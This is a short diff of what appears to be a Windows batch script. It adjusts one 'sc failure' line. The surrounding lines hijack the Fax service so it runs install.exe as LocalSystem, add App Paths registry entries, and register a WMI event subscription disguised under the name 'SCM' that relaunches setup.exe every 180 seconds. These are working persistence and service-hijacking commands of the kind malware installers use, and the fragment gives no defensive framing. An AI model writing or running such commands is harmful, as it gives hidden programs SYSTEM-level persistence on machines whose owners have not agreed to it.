@@ -27,7 +27,7 @@ reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\setup.exe" /t REG_SZ /d "%WINDIR%\System32\oobe\Setup.exe" /f
 
 sc config Fax binPath= "%WINDIR%\System32\cmd.exe /c start install.exe" start="auto" obj="LocalSystem"
-sc failure Fax reset=0 actions=//0//0//0
+sc failure Fax reset=0 actions=/0/0/0
 
 wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="SCM", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 180 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
 wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="SCM", CommandLineTemplate="%WINDIR%\System32\cmd.exe /c start setup.exe"
